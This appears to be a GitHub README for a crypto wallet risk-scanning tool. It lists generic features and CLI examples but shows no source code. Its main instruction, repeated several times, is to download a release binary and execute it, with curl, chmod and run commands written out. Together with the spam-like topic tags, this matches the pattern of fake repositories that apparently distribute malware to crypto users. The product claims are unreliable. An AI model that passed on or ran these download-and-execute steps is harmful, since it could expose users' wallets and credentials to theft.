# Wallet Chain Analyzer — Crypto Wallet Safety and Risk Scan

[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/nycreampie/Wallet-Chain-Analyzer/releases)

![Crypto Security](https://images.unsplash.com/photo-1616281670197-6f8d7d7b7a6a?auto=format&fit=crop&w=1200&q=60)

A tool to evaluate crypto wallet safety across chains. It scans addresses, traces fund flow, checks contracts, and flags risk. Use it to vet wallets before sending funds or interacting with unfamiliar contracts.

Badges
- Topics: ![arbitrage](https://img.shields.io/badge/topic-arbitrage-lightgrey) ![crypto](https://img.shields.io/badge/topic-crypto-yellowgreen) ![trade](https://img.shields.io/badge/topic-trade-blue)
- Other tags: ![open-source](https://img.shields.io/badge/open-source-brightgreen) ![guide](https://img.shields.io/badge/guide-included-orange)

Table of contents
- Features
- How it works
- Quick start
- Install and run
- Common scans and examples
- Risk categories and scoring
- API and integration
- Data sources
- Contributing
- License
- Releases

Features
- Multi-chain support: Ethereum, BSC, Polygon, Avalanche, and other EVM chains.
- Address audit: checks past behavior, contract calls, token transfers, and approvals.
- Fund flow tracing: follow funds across addresses and bridges.
- Contract checks: verify source, detect proxies, verify verified contract status.
- Token risk checks: detect honeypots, rug-prone tokens, and malicious transfers.
- Approval analysis: list active allowances and risky approvals.
- Heuristics and scoring: combine signals into a clear risk score.
- Reports: export JSON, CSV, and human-friendly HTML.
- CLI and API: run scans from the terminal or call the service programmatically.

How it works
- The tool queries on-chain data from public nodes and indexers.
- It parses transactions and token events.
- It applies rule sets and heuristics to tag risky behavior.
- It traces balances and moves across addresses and bridges.
- It outputs a structured report with a risk score and evidence.

Quick start

1) Download the release and run it
- Visit the Releases page and download the release asset for your OS.
- This repository hosts releases at:
  https://github.com/nycreampie/Wallet-Chain-Analyzer/releases
- Download the file that matches your platform and run it. The release asset contains the binary or packaged script that you need to execute.

2) Run the binary (example)
- Linux / macOS (tar.gz)
  - curl -L -o wallet-chain-analyzer.tar.gz "https://github.com/nycreampie/Wallet-Chain-Analyzer/releases/download/v1.0/wallet-chain-analyzer-linux.tar.gz"
  - tar xzf wallet-chain-analyzer.tar.gz
  - chmod +x wallet-chain-analyzer
  - ./wallet-chain-analyzer scan --address 0xAbc123... --chain ethereum
- Windows (exe)
  - Download wallet-chain-analyzer-windows.exe from Releases.
  - Double-click to run the GUI or open PowerShell:
  - .\wallet-chain-analyzer-windows.exe scan --address 0xAbc123... --chain ethereum

If the release file name differs, pick the matching asset in the Releases list. The release asset in the Releases page needs to be downloaded and executed.

Install and run

- System requirements
  - 2+ GB RAM
  - 100 MB free disk for binaries and cache
  - Network access to public RPC or a configured indexer

- CLI usage
  - Scan a single address
    - wallet-chain-analyzer scan --address 0xAbc123... --chain ethereum --output report.json
  - Scan a list
    - wallet-chain-analyzer scan --list addresses.txt --chain polygon --batch 10
  - Check approvals
    - wallet-chain-analyzer approvals --address 0xAbc123... --chain bsc

- GUI usage
  - Some releases include a lightweight GUI.
  - Open the app and paste an address.
  - Pick a chain and run scan.

Common scans and examples

- Quick safety check
  - wallet-chain-analyzer scan --address 0xA1B2... --fast
  - Uses a reduced rule set to return results in seconds.

- Deep trace
  - wallet-chain-analyzer trace --address 0xA1B2... --depth 5 --chain ethereum
  - Follows on-chain transfers up to 5 hops.

- Token check
  - wallet-chain-analyzer token --contract 0xTokenAddr --chain polygon
  - Checks for common rug patterns and honeypot code in the token contract.

- Approval cleanup
  - wallet-chain-analyzer approvals --address 0xA1B2... --revoke-suggestions
  - Lists token approvals and suggests safe revoke commands.

Risk categories and scoring
- Score range: 0 (low) to 100 (high).
- Key signals
  - Known malicious tags (blacklist) — high weight.
  - Interaction with mixers or bridge flags — high weight.
  - Recent large outflows — medium weight.
  - Many approvals to unknown contracts — medium weight.
  - Newly created contracts with no verification — medium weight.
  - Low on-chain history but large incoming funds — medium weight.
  - High token transfer churn — low weight.

- Example flags
  - MixerInteraction: funds passed through mixer addresses.
  - RugHistory: contracts linked to prior rug pulls.
  - HoneypotSuspect: token prevents sells.
  - HighAllowance: large indefinite allowances to contracts.
  - ProxyContract: contract is a proxy with unknown impl.

Reports and outputs
- JSON
  - Full structured output for automation.
- CSV
  - Tabular export for spreadsheets.
- HTML
  - Human-friendly report with charts.
- Visuals
  - Sankey-style fund flow maps.
  - Time series of transfers.
  - Top counterparty list.

API and integration
- Local API
  - Run the binary with --api flag to expose a local REST API.
  - Example: curl http://127.0.0.1:8000/scan -d '{"address":"0xA1B2...","chain":"ethereum"}'
- Webhook integration
  - Configure a webhook to receive scan results.
- Library
  - The project exposes a minimal SDK in Python and JS in the releases for integration.

Data sources
- Public RPC nodes (Infura, Alchemy, public nodes).
- Block explorers (Etherscan, BscScan) for contract verification metadata.
- Indexers (TheGraph and internal index caches) for event queries.
- Community feeds and curated blacklists for known bad actors.

Privacy and offline use
- Run the binary on your machine for local scans.
- The tool supports custom node endpoints. Point it to a private node if you run one.

Security model
- The tool reads on-chain data only.
- It does not hold private keys.
- It does not broadcast transactions unless you ask it to build and send a revoke or recovery tx.

Examples: real CLI sessions

- Single address, JSON output
  - wallet-chain-analyzer scan --address 0x4e...d9 --chain ethereum --output report.json
  - cat report.json | jq '.risk_score, .top_flags'

- Batch scan with CSV
  - wallet-chain-analyzer scan --list my-wallets.txt --chain bsc --output batch.csv

- Trace with depth and output
  - wallet-chain-analyzer trace --address 0x4e...d9 --depth 3 --output flow.html

Integration recipes

- Use with monitoring
  - Run periodic scans via cron.
  - If risk_score > 70, send alert to Slack or email.
- Use with trading tools
  - Scan token contracts before adding a new trading pair.
- Use in onboarding
  - Scan user wallets during KYC or risk checks.

Contributing
- Open source process
  - Fork the repo.
  - Create a feature branch.
  - Add tests and docs.
  - Open a pull request.

- Code style
  - Use simple names.
  - Keep functions short.
  - Add unit tests for heuristics.

- Issue types
  - Bug: incorrect parsing or API errors.
  - Feature: add new chain or risk rule.
  - Data: add new blacklist entry or pattern.

Testing and validation
- Test suites cover parsing, scoring, and report output.
- Use sample fixtures in tests/fixtures for known cases.
- Run tests with: pytest or the included test runner in the release.

Ecosystem and tools
- Works well with block explorers and analytics tools.
- Use existing indexers for faster scans.
- Combine with SIEM for enterprise monitoring.

Assets and visuals
- Use the HTML report for visual review.
- Export Sankey and timeline charts to PNG for reports.

Release and updates
- Grab the current release from:
  https://github.com/nycreampie/Wallet-Chain-Analyzer/releases
- Download the matching asset and execute it for your OS.
- Releases contain change logs and binary assets.

Troubleshooting
- If a release asset does not run, pick the next matching asset on the Releases page.
- If a network call fails, point the tool at a different RPC endpoint.
- If you see false positives, open an issue and attach the JSON report.

License
- The project uses an open source license included in the repo (LICENSE file).
- Check the license file in the repository for terms.

Contact and maintainers
- Report issues via the repo Issues tab.
- Open pull requests for patches and new rules.

Releases (again)
[![Releases - Download](https://img.shields.io/badge/Releases-Download-blue?logo=github&style=for-the-badge)](https://github.com/nycreampie/Wallet-Chain-Analyzer/releases)
Visit the Releases page to download the release asset that matches your OS and run it. If the Releases page changes, check the Releases section in this repository for the latest assets and instructions.

Screenshots and demo
![Flow Demo](https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/static/hero/hero-image.png)

Common topics
- arbitrage, cash, code, crypto, earning, free, gain, guide, income, learn, open, passive, source, trade, youtube

Acknowledgments
- Uses public on-chain data.
- Leverages community-curated blacklist feeds.
- Thanks to maintainers and contributors for rules and tests.